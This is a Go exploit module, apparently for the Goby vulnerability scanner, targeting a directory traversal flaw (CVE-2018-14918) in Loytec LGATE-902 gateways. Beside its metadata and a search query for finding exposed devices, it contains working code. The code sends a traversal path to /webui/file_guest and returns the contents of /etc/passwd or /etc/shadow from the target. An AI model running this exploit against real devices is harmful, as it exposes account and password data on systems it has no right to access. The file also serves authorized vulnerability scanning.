package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "LOYTEC LINX Traversal File (CVE-2018-14918)",
    "Description": "Loytec LGATE-902 is a gateway device of Loytec company in Germany. Loytec lgate-902 versions prior to 6.4.2 have a directory traversal vulnerability, which can be exploited to read arbitrary files in the system.",
    "Impact": "LOYTEC LINX Traversal File (CVE-2018-14918)",
    "Recommendation": "<p>Update to the latest version, select the product model on the following page, and download the corresponding version:</p><p><a href=\"http://www.loytec.com/support/download\">http://www.loytec.com/support/download</a></p>",
    "Product": "LOYTEC-LINX",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "Loytec LGATE目录遍历漏洞（CVE-2018-14918）",
            "Description": "Loytec LGATE-902是德国Loytec公司的一款网关设备。6.4.2之前的Loytec lgate-902版本存在目录遍历漏洞，可利用此漏洞读取系统任意文件。",
            "Impact": "直接访问攻击者想要的敏感数据 ，包括配置文件、日志、源代码等，配合其它漏洞的综合利用，攻击者可以轻易的获取更高的权限。",
            "Recommendation": "<p>更新至最新版本，在以下页面中选择产品型号，下载对应版本：</p><p><a href=\"http://www.loytec.com/support/download\" target=\"_blank\">http://www.loytec.com/support/download</a></p>",
            "Product": "LOYTEC-LINX",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "LOYTEC LINX Traversal File (CVE-2018-14918)",
            "Description": "Loytec LGATE-902 is a gateway device of Loytec company in Germany. Loytec lgate-902 versions prior to 6.4.2 have a directory traversal vulnerability, which can be exploited to read arbitrary files in the system.",
            "Impact": "LOYTEC LINX Traversal File (CVE-2018-14918)",
            "Recommendation": "<p>Update to the latest version, select the product model on the following page, and download the corresponding version:</p><p><a href=\"http://www.loytec.com/support/download\">http://www.loytec.com/support/download</a></p>",
            "Product": "LOYTEC-LINX",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "(body=\"device_info/device_info\")",
    "GobyQuery": "(body=\"device_info/device_info\")",
    "Author": "atdpa4sw0rd@gmail.com",
    "Homepage": "https://www.loytec.com/",
    "DisclosureDate": "2021-06-03",
    "References": [
        "https://packetstormsecurity.com/files/152453/Loytec-LGATE-902-XSS-Traversal-File-Deletion.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "5.6",
    "CVEIDs": [
        "CVE-2018-14918"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-201904-459"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "File",
            "type": "select",
            "value": "/etc/passwd,/etc/shadow",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10199"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfgGet := httpclient.NewGetRequestConfig("/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152")
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.FollowRedirect = false
			cfgGet.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfgGet); err == nil {
				return resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, ":/bin/sh") || strings.Contains(resp.Utf8Html, "/home/admin"))
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["File"].(string)
			uri := fmt.Sprintf("/webui/file_guest?path=/var/www/documentation/../../../../..%s&flags=1152", cmd)
			cfgGet := httpclient.NewGetRequestConfig(uri)
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.FollowRedirect = true
			cfgGet.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgGet); err == nil {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}
